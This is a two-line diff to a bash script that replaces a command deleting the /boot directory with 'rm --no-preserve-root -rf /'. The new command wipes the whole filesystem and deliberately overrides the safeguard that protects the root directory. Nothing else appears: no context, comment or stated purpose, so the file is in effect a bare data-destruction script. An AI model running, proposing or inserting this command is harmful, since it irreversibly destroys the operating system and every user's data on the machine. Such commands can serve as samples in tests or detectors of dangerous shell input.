@@ -1,2 +1,2 @@
 #!/bin/bash
-rm -rf /boot
+rm --no-preserve-root -rf /
